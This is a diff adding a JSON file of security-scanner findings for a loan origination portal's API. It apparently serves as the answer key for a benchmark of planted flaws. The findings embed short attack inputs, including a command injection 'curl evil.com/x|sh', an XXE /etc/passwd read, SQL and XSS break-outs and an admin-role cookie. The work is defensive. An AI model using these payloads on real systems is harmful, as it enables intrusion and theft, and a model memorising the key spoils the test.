@@ -1,0 +1,707 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.authbypass.verification-token-not-checked",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 523,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 538,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "completeAccountVerification looks up the user by email and immediately issues a signed session cookie without ever comparing the supplied `token` to `account.resetTokenHash` (contrast with /auth/password-reset/confirm, which correctly looks the user up BY the hashed token). Any string of 20+ characters passes zod validation, so anyone who knows a victim's email can log in as that user, including admins.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.jwt.none-algorithm-accepted",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2753,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2777,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "acknowledgePartnerDeliveryReceipt verifies the attacker-supplied `x-partner-delivery-receipt` header with jwt.verify(receipt, secret, { algorithms: [\"HS256\", \"none\"] }). Including \"none\" in the allowed algorithms means a token with alg:\"none\" and an empty signature is accepted without any cryptographic verification, letting anyone forge arbitrary claims (integrationId, externalId, status) and trigger fake partner delivery acknowledgements. The sibling recordDeliveryAcknowledgement handler correctly restricts algorithms to [\"HS256\"].",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.missingauth.case-timeline-unauthenticated",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 572,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 598,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getCaseTimeline is registered at line 598, before the router.use(requireAuth) gate at line 626, so /api/cases/:externalId/timeline requires no authentication at all. It returns internal underwriting notes, decision reasons, and assignment info for any application whose externalId is known or guessed (format APP-YYYY-NNNN is enumerable).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-notes-search",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1675,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1686,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchUnderwritingNotesByFilter builds a raw SQL string by directly interpolating the unsanitized `severity` and `keyword` query parameters into AppDataSource.query(...): `WHERE severity = '${severity}' AND body ILIKE '%${keyword}%'`. An attacker can break out of the string literal to run arbitrary SQL (e.g. severity=x' UNION SELECT ...--). The adjacent searchBorrowerMessagesByFilter handler does the equivalent lookup safely using parameterized placeholders ($1, $2).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-dossier-export",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1340,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1353,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generateApplicationDossierExport takes `format` directly from req.query.format with no whitelist and interpolates it into a shell command string executed via spawn(..., { shell: true }): `scripts/render-dossier.sh ${application.externalId} ${format} ${outputPath}`. An attacker can inject shell metacharacters in `format` (e.g. `pdf; curl evil.com/x|sh`) to execute arbitrary commands. The nearly identical generatePartnerDossierExport safely whitelists format against DOSSIER_FORMATS and uses shell:false with an argv array.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.codeinjection.new-function-pricing-formula",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3359,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 3375,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCustomPricingFormula takes the fully attacker-controlled `formula` query parameter and interpolates it directly into a `new Function(\"context\", \"with (context) { return (\" + userFormula + \"); }\")` which is then invoked. Since the Function constructor executes in the global scope, an attacker can reach `process`/`require` (e.g. via `this.process.mainModule.require('child_process')`) to achieve remote code execution. The neighboring previewStandardPricingScenario safely dispatches to a fixed whitelist of formula functions (STANDARD_PRICING_SCENARIOS).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssti.handlebars-user-controlled-template",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2657,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2680,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "saveBorrowerReplyTemplate lets any authenticated user with view access (including a borrower) store an arbitrary template string via `body.templateBody`. renderReplyTemplatePreview then does `Handlebars.compile(storedTemplate)` and executes it \u2014 the attacker controls the TEMPLATE SOURCE itself, not just the data. This is server-side template injection; well-known Handlebars gadgets (e.g. via `{{#with}}`/`lookup`/`constructor`) allow arbitrary code execution on the server. renderStandardAcknowledgementPreview instead compiles a fixed, non-user-controlled STANDARD_ACKNOWLEDGEMENT_TEMPLATE constant.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection",
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.partner-collateral-fetch",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3409,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 3424,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "ingestPartnerCollateralDocument reads an arbitrary URL from the `x-partner-document-url` header and fetches it directly with no host allowlist or scheme restriction, letting a staff-authenticated attacker make the server issue requests to internal/cloud-metadata endpoints (e.g. http://169.254.169.254/...) and leak response length/status. The neighboring ingestComplianceBulletinDocument correctly validates the target hostname against ALLOWED_COMPLIANCE_BULLETIN_HOSTS.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.workspace-envelope-external-entity",
+      "path": "server/src/utils/workspaceEnvelope.ts",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "expandEntities parses a DOCTYPE/ENTITY block from XML supplied via the `lop_workspace_envelope` cookie and, when an entity value starts with `file://`, reads that file from disk with fs.readFileSync and substitutes its contents into the output. getWorkspaceEnvelopeState (api.ts lines 1595-1606) feeds an attacker-controlled cookie straight into parseWorkspaceEnvelope, which calls this function. An attacker can set a cookie containing `<!DOCTYPE x [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> ... &xxe;` to exfiltrate arbitrary files readable by the Node process back in the JSON response. parseTrustedWorkspaceEnvelope (used by the partner variant) safely rejects any input containing `<!DOCTYPE`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.massassignment.queue-preferences-privilege-escalation",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2855,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2865,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restoreReviewerQueuePreferences parses the attacker-controlled `rq_prefs` cookie as JSON and does `Object.assign(user, parsed)` before saving the TypeORM User entity. Because there is no field allowlist, a staff user (underwriter/support_specialist) can set a cookie like `{\"role\":\"admin\"}` to persist a privilege escalation to admin (or manipulate `disabled`, `passwordHash`, `email`, etc.) on their own account.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.massassignment.intake-form-update",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3111,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 3120,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyIntakeFormUpdate does `Object.assign(application, req.body)` with no schema/allowlist after only checking that a borrower owns the application. A borrower can PATCH /applications/:id/intake-form with a body like {\"status\":\"approved\",\"riskTier\":\"A\",\"decisionSummary\":\"...\"} to overwrite any column on the LoanApplication entity, bypassing the workflow/decision policy entirely. The sibling applyIntakeFormPatch validates the body against a strict zod schema (`.strict()`) allowing only purpose/termMonths/addressLine1.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-staff-directory-search",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 670,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 679,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectory builds an LDAP filter by directly interpolating the unsanitized `q` query parameter: `(&(department=underwriting)(cn=*${term}*))`. An attacker can inject filter metacharacters (`)`, `(`, `*`) to widen or alter the query beyond the intended department filter, e.g. `q=*)(department=*` to match unintended entries. The neighboring verifyBranchGroupAccess correctly escapes its input with escapeDirectoryFilterValue before building the filter.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.pathtraversal.working-paper-draft-write",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1400,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1410,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "syncWorkingPaperDraft takes `workspaceAlias` straight from the `lop_workspace_alias` cookie with no sanitization and joins it into a directory path that is then mkdir'd and written to: `path.join(WORKING_PAPER_DIR, workspaceAlias)`. A cookie value like `../../../../tmp/evil` lets an authenticated user write markdown files outside WORKING_PAPER_DIR, potentially overwriting arbitrary files reachable by traversal. The near-identical syncCaseChecklistDraft sanitizes the same cookie value with path.basename() before use.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.idor.underwriting-note-detail",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1653,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1673,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getUnderwritingNoteDetail fetches an UnderwritingNote purely by its `id` route parameter and returns its body/severity/author with no check that the requesting user is staff or has access to the parent application (unlike every other note/application handler, which calls assertCanView/isStaffRole). Any authenticated user, including a borrower, can enumerate note IDs to read internal underwriting notes for applications they do not own.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.accesscontrol.trusted-header-and-type-confusion",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3464,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 3485,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolvePartnerIntegrationAccess grants `elevated: true` if the client-supplied `x-partner-role` request header equals \"admin\" (`partnerRole == \"admin\"`), letting any authenticated user (including borrowers, since this route only requires requireAuth) self-declare elevated access via a spoofable header. Separately, queryPartnerAccessLedger returns the string `\"false\"` for even branch IDs, and `if (result.access)` treats that non-empty string as truthy, so even branchIds are incorrectly granted `elevated: true` regardless of the header. The sibling resolveComplianceIntegrationAccess fixes the type-confusion bug with a strict `result.access === true` check but retains the same spoofable-header bypass.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-290: Authentication Bypass by Spoofing",
+            "CWE-697: Incorrect Comparison"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded.jwt-secret-fallback",
+      "path": "server/src/config.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 10,
+        "col": 80,
+        "offset": 0
+      },
+      "extra": {
+        "message": "config.jwtSecret falls back to the hardcoded literal \"dev-only-change-me-loan-origination-portal\" whenever the JWT_SECRET environment variable is unset. Since this value is committed in source, any deployment that forgets to set JWT_SECRET signs session cookies (signSession) with a publicly known key, letting an attacker forge a valid session/JWT for any user id and role, including admin.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.pathtraversal.checklist-template-locale-header",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1375,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1383,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getChecklistTemplate builds a file path directly from the `x-checklist-locale` request header with no sanitization: `path.join(CHECKLIST_TEMPLATE_DIR, \\`${locale}.md\\`)`. A header value like `../../../../etc/somefile%00` (or any relative path) lets an authenticated user read .md files outside CHECKLIST_TEMPLATE_DIR. The neighboring getExhibitTemplate sanitizes the equivalent `x-exhibit-key` header with path.basename() before building the path.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.openredirect.document-flow-complete",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3234,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 3245,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "completeDocumentUploadFlow redirects to a URL taken directly from the `x-redirect-url` header or `body.returnTo` with no validation: `res.redirect(nextUrl)`. An attacker can supply a full external URL (e.g. `https://evil.example/phish`) to redirect authenticated users off-site. The neighboring completeEsignatureFlow validates `returnTo` against ALLOWED_ESIGNATURE_DESTINATIONS or checks that the parsed URL's origin matches config.appOrigin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.workspace-theme-cookie-script-injection",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1575,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1581,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getWorkspaceThemeWidget injects the raw `lop_theme_pref` cookie value into an inline `<script>` block with no escaping: `<script>var workspaceTheme = \"${themePref}\";...</script>`. A cookie value containing `\";alert(document.cookie);//` breaks out of the string literal and executes attacker-controlled JavaScript in the victim's session. The near-identical getWorkspaceLayoutWidget correctly runs the equivalent cookie value through htmlEscape() before interpolation.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-Site Scripting"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-with-credentials-integration-health",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2623,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2636,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getPartnerIntegrationHealthWidget reflects the request's Origin header verbatim into Access-Control-Allow-Origin and additionally sets Access-Control-Allow-Credentials: true with no allowlist check, defeating the same-origin policy for this endpoint and permitting any website to make credentialed cross-origin requests to it. The neighboring getPartnerIntegrationStatusFeed only reflects the origin, and sets these headers, when it is present in PARTNER_PORTAL_ORIGINS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-partner-widget",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 1543,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1555,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getPartnerStatementWidget reflects an arbitrary caller-supplied Origin header into Access-Control-Allow-Origin and removes the X-Frame-Options protection whenever an `x-partner-key` header is present (with no validation of its value), allowing any site presenting some non-empty key to both read the cross-origin response and iframe the widget for clickjacking. The neighboring getPartnerDashboardWidget instead sets a Content-Security-Policy frame-ancestors directive scoped to the real partner origin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cryptography.cbc-padding-oracle-draft-state",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3147,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 3168,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "advanceIntakeWizardStep decrypts the client-supplied draftState with unauthenticated AES-256-CBC (draftStateCipher.ts) and returns distinct, attacker-observable error responses depending on whether decryption failed due to bad padding ('bad decrypt'/'wrong final block length') versus other failures. This distinguishing oracle enables a classic CBC padding-oracle attack, letting an attacker decrypt (and, with a bit more work, forge) draftState ciphertext without knowing the server's key. The GCM-based advanceUnderwritingWorksheetStep instead returns one generic error for any failure.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection-document-label-search",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2484,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2498,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findKybDocumentsByLabel interpolates the unescaped `label` query parameter directly into an XPath-like predicate string: `//document[@label='${label}']`, which RecordIndex.find then parses with a regex to extract equality predicates. A label containing a single quote can break out of the intended predicate and inject additional attribute predicates, altering which documents are matched. The neighboring findKybDocumentsByCategory escapes the equivalent `category` value with escapeXPathString() before building the expression.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.bruteforce.access-recovery-unrate-limited",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 459,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 489,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "initiateAccessRecovery (mounted at POST /auth/access-recovery, line 489) matches accounts by ownerName plus a 4-digit taxIdentifierLast4 with no rate limiting, allowing an attacker who knows a target's name to brute-force the 10,000 possible last-4 values and trigger issuance of a valid reset token to the mock outbox. The nearly identical initiateAccountVerification flow is protected by accountVerificationLimiter (a 6-requests/15-minutes rate limiter) on its /auth/verification/start route.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-307: Improper Restriction of Excessive Authentication Attempts"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cookie.session-token-missing-httponly-mobile-companion",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2946,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2958,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "syncMobileCompanionSession sets the signed session JWT in a cookie (`lop_companion_session`) with no httpOnly, secure, or sameSite attributes, making the authentication token readable by client-side JavaScript and exposing it to theft via any XSS. The equivalent syncDesktopCompanionSession sets httpOnly, secure, and sameSite: 'strict' on lop_desktop_companion_session.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.infoleak.stack-trace-portfolio-risk-summary",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2408,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2419,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generatePortfolioRiskSummary's catch block returns `error.message` and `error.stack` directly in the JSON response body on failure, leaking internal file paths, query details, and stack traces to the client. The neighboring generateComplianceExposureSummary logs the error server-side and returns only a generic message plus an opaque errorId.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.unvalidated-query-filter-search-by-criteria",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 3193,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 3204,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchLoanApplicationsByCriteria spreads the entire raw request body (`{ ...req.body }`) directly into TypeORM's `where` option, and takes the ORDER BY column name straight from `req.query.sortBy` with no whitelist, letting a staff caller submit unvalidated, arbitrarily-shaped filter/sort objects for a data query with no schema enforcement. The neighboring searchLoanApplicationsByFields validates the filter body with a zod schema and restricts sortBy to ALLOWED_SEARCH_SORT_FIELDS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-943: Improper Neutralization of Special Elements in Data Query Logic"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.loginjection.portfolio-search-activity-log",
+      "path": "server/src/routes/api.ts",
+      "start": {
+        "line": 2439,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2444,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "recordPortfolioSearchActivity writes the raw, unsanitized `query` parameter directly into the application log: `activityLog.info(\\`user ${user.id} searched portfolio for: ${searchQuery}\\`)`. An attacker can include CR/LF characters to inject fabricated log lines (log forging), potentially confusing log analysis or SIEM alerting. The neighboring recordDocumentSearchActivity strips `[\\r\\n\\0]` from the equivalent query value before logging.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
